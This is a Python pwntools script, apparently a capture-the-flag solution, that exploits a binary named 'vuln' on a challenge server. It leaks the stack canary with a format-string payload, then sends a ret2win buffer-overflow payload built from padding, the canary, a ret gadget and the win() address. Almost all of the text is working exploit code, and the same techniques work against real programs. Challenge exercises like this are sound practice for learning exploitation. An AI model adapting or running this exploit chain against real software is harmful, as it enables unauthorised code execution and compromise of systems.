#!/usr/bin/env python3
from pwn import *
import os
import sys

# ---------------------------------------------------------------------------
# Section 0 — Configuration
# ---------------------------------------------------------------------------
context.arch = "amd64"
context.log_level = "info"

# If you want to use GDB, uncomment the terminal line below
# context.terminal = ['tmux', 'splitw', '-h']

try:
    exe = ELF('./vuln', checksec=False)
except FileNotFoundError:
    log.error("Could not find ./vuln locally.")
    sys.exit(1)

# Distance from the start of field5_buf to the stack canary
BUF_TO_CANARY = 72

def auth_choice(p, choice):
    p.recvuntil(b"3. Exit")
    p.recvuntil(b"> ")
    p.sendline(str(choice).encode())

def menu_choice(p, choice):
    p.recvuntil(b"6. Exit")
    p.recvuntil(b"> ")
    p.sendline(str(choice).encode())

# ---------------------------------------------------------------------------
# Section 1 — Connect & Authenticate
# ---------------------------------------------------------------------------

HOST = "challenges.cyberguardiansensate.com"
PORT = 10105

if args.REMOTE:
    log.info(f"Connecting to remote server {HOST}:{PORT}...")
    p = remote(HOST, PORT)
else:
    log.info("Running locally for debugging...")
    p = process('./vuln')


USERNAME = b"ubaida"
PASSWORD = b"ubaida"

log.info(f"Registering user {USERNAME.decode()}")
auth_choice(p, 1)
p.sendlineafter(b"username: ", USERNAME)
p.sendlineafter(b"password: ", PASSWORD)

log.info("Logging in")
auth_choice(p, 2)
p.sendlineafter(b"Username: ", USERNAME)
p.sendlineafter(b"Password: ", PASSWORD)

# ---------------------------------------------------------------------------
# Section 2 — Leak Canary
# ---------------------------------------------------------------------------
# We still need the Canary, so we use Field 3's format string vuln
SCAN_RANGE = range(100, 121)

log.info("Field 3: sending canary-leak format string")
menu_choice(p, 3)
fmt_canary = b"C:" + b"|".join(f"%{i}$p".encode() for i in SCAN_RANGE)
p.sendlineafter(b"bio): ", fmt_canary)

# ---------------------------------------------------------------------------
# Section 3 — Prompt for Canary and Win() Address
# ---------------------------------------------------------------------------
print("\n" + "=" * 72)
print(f"  Open the Flask dashboard and log in as: {USERNAME.decode()}")
print("  Field 3 holds the canary     (look for 0xXXXXXXXXXXXXXX00)")
print("=" * 72)

raw_canary = input("Enter ONLY the Canary (e.g. 0x496c18286981e600): ")
canary = int(raw_canary.strip(), 16)
log.success(f"Canary = {canary:#018x}")

# Automatically grab win address using pwntools if possible, else ask user
try:
    win_addr = exe.symbols['win']
    log.success(f"Automatically found win() at {win_addr:#x}")
except KeyError:
    raw_win = input("Could not find win() automatically. Enter address of win() (e.g. 0x401234): ")
    win_addr = int(raw_win.strip(), 16)
    log.success(f"Win Address = {win_addr:#x}")

# ---------------------------------------------------------------------------
# Section 4 — Build Ret2Win Payload
# ---------------------------------------------------------------------------
# The payload perfectly fills the buffer, places the exact canary back where
# it belongs, writes 8 bytes of garbage over RBP, and overwrites the return 
# instruction pointer (RIP) with the address of our win() function.
# We also include a single `ret` gadget before `win()` to bypass Ubuntu's 
# 16-byte stack alignment (movaps) requirement during printf.
ret_gadget = ROP(exe).find_gadget(['ret'])[0]

payload  = b"A" * BUF_TO_CANARY
payload += p64(canary)            
payload += p64(0xdeadbeefcafebabe) # junk for saved rbp
payload += p64(ret_gadget)         # movaps stack alignment 
payload += p64(win_addr)           # Return directly to win()!
payload  = payload.ljust(512, b"\x00")

# ---------------------------------------------------------------------------
# Section 5 — Deliver Payload & Execute
# ---------------------------------------------------------------------------
log.info("Field 5: delivering BOF payload")
menu_choice(p, 5)
p.sendafter(b"signature):\n", payload)

log.info("Selecting 6. Exit -> vulnerable_menu() returns -> win() fires")
menu_choice(p, 6)

log.info("Harvesting output...")
data = p.recvall(timeout=3)

print("\n" + "=" * 72)
print("RAW PROCESS OUTPUT")
print("=" * 72)
print(data.decode("utf-8", errors="replace"))
print("=" * 72)

p.close()
